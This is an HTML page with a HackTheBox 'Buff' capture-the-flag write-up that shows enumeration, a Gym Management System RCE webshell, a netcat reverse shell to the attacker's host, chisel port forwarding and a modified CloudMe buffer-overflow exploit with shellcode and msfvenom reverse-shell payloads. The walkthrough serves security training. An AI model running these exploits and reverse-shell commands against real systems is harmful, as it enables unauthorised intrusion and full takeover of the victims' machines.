<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Buff | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="Buff HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/buff/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/buff/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Buff "><meta property="og:description" content="Buff HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/buff/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/buff/buff.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-11-20T21:08:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/buff/buff.png"><meta name=twitter:title content="Buff "><meta name=twitter:description content="Buff HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Buff ","item":"https://s4ch.github.io/writeups/hackthebox/buff/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Buff ","name":"Buff ","description":"Buff HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"Information Name: Buff Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap lynx exploitdb ffuf windows-binaries pwncat chisel Network enumeration Port and service scan with nmap:\n# Nmap 7.80 scan initiated Mon Nov 2 19:24:39 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up (0.077s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 7680/tcp open pando-pub? 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 2 19:31:30 2020 -- 1 IP address (1 host up) scanned in 411.20 seconds HTTP enumeration List the links in the homepage.\n$ lynx -dump -listonly -nonumbers http://10.10.10.198:8080/ http://10.10.10.198:8080/ http://10.10.10.198:8080/ http://10.10.10.198:8080/packages.php http://10.10.10.198:8080/facilities.php http://10.10.10.198:8080/about.php http://10.10.10.198:8080/contact.php http://10.10.10.198:8080/packages.php http://10.10.10.198:8080/packages.php http://10.10.10.198:8080/facilities.php http://10.10.10.198:8080/facilities.php However is doesn’t show http://10.10.10.198:8080/include/process_login.php\nLet’s see if there is more pages with ffuf:\n$ ffuf -u http://10.10.10.198:8080/FUZZ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.198:8080/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ home.php [Status: 200, Size: 143, Words: 18, Lines: 3] register.php [Status: 200, Size: 137, Words: 23, Lines: 4] contact.php [Status: 200, Size: 4169, Words: 798, Lines: 119] index.php [Status: 200, Size: 4969, Words: 935, Lines: 134] feedback.php [Status: 200, Size: 4252, Words: 760, Lines: 114] . [Status: 200, Size: 4969, Words: 935, Lines: 134] upload.php [Status: 200, Size: 107, Words: 12, Lines: 3] edit.php [Status: 200, Size: 4282, Words: 844, Lines: 122] about.php [Status: 200, Size: 5316, Words: 999, Lines: 142] up.php [Status: 200, Size: 209, Words: 23, Lines: 5] profile. [Status: 301, Size: 346, Words: 22, Lines: 10] packages.php [Status: 200, Size: 7787, Words: 2315, Lines: 169] :: Progress: [10848/10848] :: Job [1/1] :: 75 req/sec :: Duration: [0:03:06] :: Errors: 0 :: I discovered a lot of promising pages: register, feedback, upload, edit, up, profile.\nBy submitting erroneous stuff at the edit page I obtained a full path disclosure: C:\\xampp\\htdocs\\gym\\editp.php\nAlso a HTTP error is disclosing the versions: Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)\nOn the contact page we can see: Made using Gym Management Software 1.0 .\nHTTP exploitation It seems it really exists:\n$ searchsploit Gym Management ------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------ --------------------------------- Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py ------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results $ searchsploit -p 48506 Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48506 Path: /usr/share/exploitdb/exploits/php/webapps/48506.py File Type: Python script, ASCII text executable, with CRLF line terminators $ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py Traceback (most recent call last): File \"/usr/share/exploitdb/exploits/php/webapps/48506.py\", line 38, in from colorama import Fore, Back, Style ImportError: No module named colorama $ sudo pacman -S python2-colorama --asdeps $ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py http://10.10.10.198:8080/ /\\ /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================\" \\/ [+] Successfully connected to webshell. C:\\xampp\\htdocs\\gym\\upload\u003e C:\\xampp\\htdocs\\gym\\upload\u003e whoami PNG buff\\shaun Upgrading from a webshell to a reverse shell I should have a pre-compiled netcat for windows:\n$ pacman -Ql windows-binaries | grep nc windows-binaries /usr/share/windows/windows-binaries/nc.exe windows-binaries /usr/share/windows/windows-binaries/nc.txt windows-binaries /usr/share/windows/windows-binaries/ncat.exe windows-binaries /usr/share/windows/windows-binaries/vncviewer.exe Even better I have ncat. Let’s share it via a web server.\n$ cp /usr/share/windows/windows-binaries/ncat.exe . $ ruby -run -ehttpd . -p8080 Need a listener:\n$ pwncat -l 9999 -vv Download it via the webshell (curl the powershell alias as we are on windows):\ncurl http://10.10.14.146:8080/ncat.exe --output ncat.exe Ncat wasn’t working so I retried with nc.\ncurl http://10.10.14.146:8080/nc.exe --output nc.exe nc.exe 10.10.14.146 9999 -e powershell.exe PS C:\\xampp\\htdocs\\gym\\upload\u003e whoami buff\\shaun PS C:\\xampp\\htdocs\\gym\\upload\u003e gc C:\\Users\\shaun\\Desktop\\user.txt f03b243a0738b73cb640ee8b7b1928d7 Privilege Escalation of Machine : from shaun to administrator Check for restricted services from the outside\nRef. HackTricks - Windows Local Privilege Escalation - Open Ports\nPS C:\\xampp\\htdocs\\gym\\upload\u003e netstat -ano netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 960 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 5672 TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING 8564 TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 3176 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 528 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1088 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1548 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 2160 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 668 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 688 ... TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING 4736 TCP 127.0.0.1:3306 127.0.0.1:50755 TIME_WAIT 0 TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 644 ... We have a MySQL server and an unknown service running locally. We may need some pivoting technique to access it (see Network pivoting state of the art - Chisel - Reverse remote port forwarding).\n[chisel] is one of the best tool out there for pivoting and it has a pre-compiled windows binary.\n$ 7z e chisel_1.7.2_windows_amd64.gz Start the server on your machine:\n$ chisel server -p 8080 --host 10.10.14.188 --reverse -v 2020/11/04 20:55:17 server: Reverse tunnelling enabled 2020/11/04 20:55:17 server: Fingerprint 67:21:79:97:03:c3:a6:2f:bd:d7:b9:c7:d9:1d:35:47 2020/11/04 20:55:17 server: Listening on 10.10.14.188:8080.. Upload the binary \u0026 execute the client:\nPS C:\\xampp\\htdocs\\gym\\upload\u003e curl http://10.10.14.188:8080/chisel.exe --output cyfun.exe PS C:\\xampp\\htdocs\\gym\\upload\u003e .\\cyfun.exe client -v http://10.10.14.188:8080 R:127.0.0.1:44444:127.0.0.1:8888 2020/11/04 20:05:19 client: Connecting to ws://10.10.14.188:8080 2020/11/04 20:05:20 client: Handshaking... 2020/11/04 20:05:20 client: Fingerprint 1a:a8:a6:b7:c1:58:25:d7:b0:9d:c4:51:4e:8f:b2:5e 2020/11/04 20:05:20 client: Sending config 2020/11/04 20:05:20 client: Connected (Latency 64.5615ms) 2020/11/04 20:05:20 client: tun: SSH connected But we have no clue what service is behind this port:\n$ nmap 127.0.0.1 -p 44444 -sVC Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 21:02 CET Nmap scan report for localhost (127.0.0.1) Host is up (0.000080s latency). PORT STATE SERVICE VERSION 44444/tcp open tcpwrapped Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds The only hint we have is on the Download folder:\nC:\\xampp\\htdocs\\gym\\upload\u003e dir C:\\users\\shaun\\Downloads\\ Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\\users\\shaun\\Downloads 14/07/2020 12:27 . 14/07/2020 12:27 .. 16/06/2020 15:26 17,830,824 CloudMe_1112.exe 1 File(s) 17,830,824 bytes 2 Dir(s) 7,130,439,680 bytes free This CloudMe seems a little bit vulnerable:\n$ searchsploit cloudme ----------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------- --------------------------------- CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR) | windows/local/48499.txt Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit) | windows_x86-64/remote/45197.rb CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass) | windows_x86-64/local/45159.py CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit) | windows/remote/44175.rb CloudMe Sync 1.11.0 - Local Buffer Overflow | windows/local/44470.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py CloudMe Sync \u003c 1.11.0 - Buffer Overflow | windows/remote/44027.py CloudMe Sync \u003c 1.11.0 - Buffer Overflow (SEH) (DEP Bypass) | windows_x86-64/remote/44784.py ----------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results $ searchsploit -p 48389 Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC) URL: https://www.exploit-db.com/exploits/48389 Path: /usr/share/exploitdb/exploits/windows/remote/48389.py File Type: ASCII text, with CRLF line terminators Let’s see this BoF exploit:\n$ cp /usr/share/exploitdb/exploits/windows/remote/48389.py . $ nvim 48389.py It seems the embedded shellcode is only making appear calc.exe, we need a reverse shell instead. The last option is to name the variable payload instead of buf.\n$ msfvenom -p windows/exec CMD='C:\\xampp\\htdocs\\gym\\upload\\nc.exe 10.10.14.188 9999 -e powershell.exe' -b '\\x00\\x0A\\x0D' -f python -v payload The whole modified exploit:\n# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC) # Date: 2020-04-27 # Exploit Author: Andy Bowden # Vendor Homepage: https://www.cloudme.com/en # Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe # Version: CloudMe 1.11.2 # Tested on: Windows 10 x86 #Instructions: # Start the CloudMe service and run the script. import socket target = \"127.0.0.1\" padding1 = b\"\\x90\" * 1052 EIP = b\"\\xB5\\x42\\xA8\\x68\" # 0x68A842B5 -\u003e PUSH ESP, RET NOPS = b\"\\x90\" * 30 #msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\\x00\\x0A\\x0D' -f python payload = b\"\" payload += b\"\\xdb\\xd3\\xbf\\x10\\x10\\x1f\\x4e\\xd9\\x74\\x24\\xf4\\x5e\" payload += b\"\\x2b\\xc9\\xb1\\x42\\x83\\xc6\\x04\\x31\\x7e\\x14\\x03\\x7e\" payload += b\"\\x04\\xf2\\xea\\xb2\\xcc\\x70\\x14\\x4b\\x0c\\x15\\x9c\\xae\" payload += b\"\\x3d\\x15\\xfa\\xbb\\x6d\\xa5\\x88\\xee\\x81\\x4e\\xdc\\x1a\" payload += b\"\\x12\\x22\\xc9\\x2d\\x93\\x89\\x2f\\x03\\x24\\xa1\\x0c\\x02\" payload += b\"\\xa6\\xb8\\x40\\xe4\\x97\\x72\\x95\\xe5\\xd0\\x6f\\x54\\xb7\" payload += b\"\\x89\\xe4\\xcb\\x28\\xbe\\xb1\\xd7\\xc3\\x8c\\x54\\x50\\x37\" payload += b\"\\x44\\x56\\x71\\xe6\\xdf\\x01\\x51\\x08\\x0c\\x3a\\xd8\\x12\" payload += b\"\\x51\\x07\\x92\\xa9\\xa1\\xf3\\x25\\x78\\xf8\\xfc\\x8a\\x45\" payload += b\"\\x35\\x0f\\xd2\\x82\\xf1\\xf0\\xa1\\xfa\\x02\\x8c\\xb1\\x38\" payload += b\"\\x79\\x4a\\x37\\xdb\\xd9\\x19\\xef\\x07\\xd8\\xce\\x76\\xc3\" payload += b\"\\xd6\\xbb\\xfd\\x8b\\xfa\\x3a\\xd1\\xa7\\x06\\xb6\\xd4\\x67\" payload += b\"\\x8f\\x8c\\xf2\\xa3\\xd4\\x57\\x9a\\xf2\\xb0\\x36\\xa3\\xe5\" payload += b\"\\x1b\\xe6\\x01\\x6d\\xb1\\xf3\\x3b\\x2c\\xdf\\x02\\xc9\\x4a\" payload += b\"\\xad\\x05\\xd1\\x54\\x81\\x6d\\xe0\\xdf\\x4e\\xe9\\xfd\\x35\" payload += b\"\\x2b\\x05\\xb4\\x14\\x1d\\x8e\\x11\\xcd\\x1c\\xd3\\xa1\\x3b\" payload += b\"\\x62\\xea\\x21\\xce\\x1a\\x09\\x39\\xbb\\x1f\\x55\\xfd\\x57\" payload += b\"\\x6d\\xc6\\x68\\x58\\xc2\\xe7\\xb8\\x3b\\x8b\\x67\\x3a\\x9c\" payload += b\"\\x10\\xb2\\xe0\\xa9\\xe5\\xa7\\x6a\\x21\\x55\\x69\\xef\\xa8\" payload += b\"\\x0c\\x07\\x86\\x41\\xba\\xa5\\x39\\xd2\\x2d\\x38\\xe6\\x7e\" payload += b\"\\xd4\\xcf\\x7d\\x0b\\x79\\x40\\xde\\x81\\xea\\xcf\\xaa\\x4b\" payload += b\"\\x80\\x77\\x27\\xb4\\x2b\\xb2\\x9b\\xc1\\xd8\\xa7\\x51\\x59\" payload += b\"\\x42\\x5b\\xfe\\xfc\\x0f\\xf5\\xa2\\xa8\\x86\\x6d\\x3e\\x3a\" payload += b\"\\x2b\\x32\\xae\\xab\\xb9\\xab\\x44\\x1a\\x49\\x54\\xed\\x62\" overrun = b\"C\" * (1500 - len(padding1 + NOPS + EIP + payload))\tbuf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,44444)) s.send(buf) except Exception as e: print(sys.exc_value) I had no luck with the previous payload so I tried others:\nmsfvenom -p windows/exec CMD='copy C:\\users\\Administrator\\desktop\\root.txt C:\\users\\shaun\\Videos\\cyfun.txt' -b '\\x00\\x0A\\x0D' -f python -v payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.188 LPORT=9999 -b '\\x00\\x0A\\x0D' -f python -v payload I had more luck with windows/shell_reverse_tcp but it was just service being unstable. It’s possible the 1st exploit tentative made the service partially crash.\n$ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.198:49704 (family 2/IPv4, TCP) Microsoft Windows [Version 10.0.17134.1610] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami buff\\administrator C:\\Windows\\system32\u003etype c:\\users\\Administrator\\desktop\\root.txt ccf880bd191ba6b99c413b3855a8bb6d ","wordCount":"1548","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/buff/buff.png","datePublished":"2020-11-20T21:08:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/buff/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Buff</h1><div class=post-description>Buff HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-11-20 21:08:00 +0000 UTC'>November 20, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;8 min&amp;nbsp;·&amp;nbsp;1548 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/windows/" class="post-tag" title="windows">windows&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/easy/" class="post-tag" title="easy">easy&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/buff/buff.png alt="Buff HackTheBox Machine"><p>Buff - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation>HTTP exploitation</a></li><li><a href=#upgrading-from-a-webshell-to-a-reverse-shell>Upgrading from a webshell to a reverse shell</a></li><li><a href=#privilege-escalation-of-machine--from-shaun-to-administrator>Privilege Escalation of Machine : from shaun to administrator</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Buff</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/263>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap lynx exploitdb ffuf windows-binaries pwncat chisel
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with <a href=https://nmap.org/>nmap</a>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Mon Nov  2 19:24:39 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.198
Nmap scan report for 10.10.10.198
Host is up (0.077s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n&#39;s Bro Hut

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  2 19:31:30 2020 -- 1 IP address (1 host up) scanned in 411.20 seconds
</code></pre><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>List the links in the homepage.</p><pre tabindex=0><code>$ lynx -dump -listonly -nonumbers http://10.10.10.198:8080/
http://10.10.10.198:8080/
http://10.10.10.198:8080/
http://10.10.10.198:8080/packages.php
http://10.10.10.198:8080/facilities.php
http://10.10.10.198:8080/about.php
http://10.10.10.198:8080/contact.php
http://10.10.10.198:8080/packages.php
http://10.10.10.198:8080/packages.php
http://10.10.10.198:8080/facilities.php
http://10.10.10.198:8080/facilities.php
</code></pre><p>However is doesn&rsquo;t show http://10.10.10.198:8080/include/process_login.php</p><p>Let&rsquo;s see if there is more pages with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.198:8080/FUZZ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.198:8080/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

home.php                [Status: 200, Size: 143, Words: 18, Lines: 3]
register.php            [Status: 200, Size: 137, Words: 23, Lines: 4]
contact.php             [Status: 200, Size: 4169, Words: 798, Lines: 119]
index.php               [Status: 200, Size: 4969, Words: 935, Lines: 134]
feedback.php            [Status: 200, Size: 4252, Words: 760, Lines: 114]
.                       [Status: 200, Size: 4969, Words: 935, Lines: 134]
upload.php              [Status: 200, Size: 107, Words: 12, Lines: 3]
edit.php                [Status: 200, Size: 4282, Words: 844, Lines: 122]
about.php               [Status: 200, Size: 5316, Words: 999, Lines: 142]
up.php                  [Status: 200, Size: 209, Words: 23, Lines: 5]
profile.                [Status: 301, Size: 346, Words: 22, Lines: 10]
packages.php            [Status: 200, Size: 7787, Words: 2315, Lines: 169]
:: Progress: [10848/10848] :: Job [1/1] :: 75 req/sec :: Duration: [0:03:06] :: Errors: 0 ::
</code></pre><p>I discovered a lot of promising pages: register, feedback, upload, edit, up,
profile.</p><p>By submitting erroneous stuff at the edit page I obtained a full path disclosure:
<code>C:\xampp\htdocs\gym\editp.php</code></p><p>Also a HTTP error is disclosing the versions: Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</p><p>On the contact page we can see: <code>Made using Gym Management Software 1.0 </code>.</p><h2 id=http-exploitation>HTTP exploitation<a hidden class=anchor aria-hidden=true href=#http-exploitation>#</a></h2><p>It seems it really exists:</p><pre tabindex=0><code>$ searchsploit Gym Management
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Gym Management System 1.0 - Unauthenticated Remote Code Execution                   | php/webapps/48506.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

$ searchsploit -p 48506
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators

$ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py
Traceback (most recent call last):
  File &#34;/usr/share/exploitdb/exploits/php/webapps/48506.py&#34;, line 38, in &lt;module&gt;
    from colorama import Fore, Back, Style
ImportError: No module named colorama

$ sudo pacman -S python2-colorama --asdeps

$ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU=====================&#34;
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload&gt; C:\xampp\htdocs\gym\upload&gt; whoami
PNG

buff\shaun
</code></pre><h2 id=upgrading-from-a-webshell-to-a-reverse-shell>Upgrading from a webshell to a reverse shell<a hidden class=anchor aria-hidden=true href=#upgrading-from-a-webshell-to-a-reverse-shell>#</a></h2><p>I should have a pre-compiled netcat for windows:</p><pre tabindex=0><code>$ pacman -Ql windows-binaries | grep nc
windows-binaries /usr/share/windows/windows-binaries/nc.exe
windows-binaries /usr/share/windows/windows-binaries/nc.txt
windows-binaries /usr/share/windows/windows-binaries/ncat.exe
windows-binaries /usr/share/windows/windows-binaries/vncviewer.exe
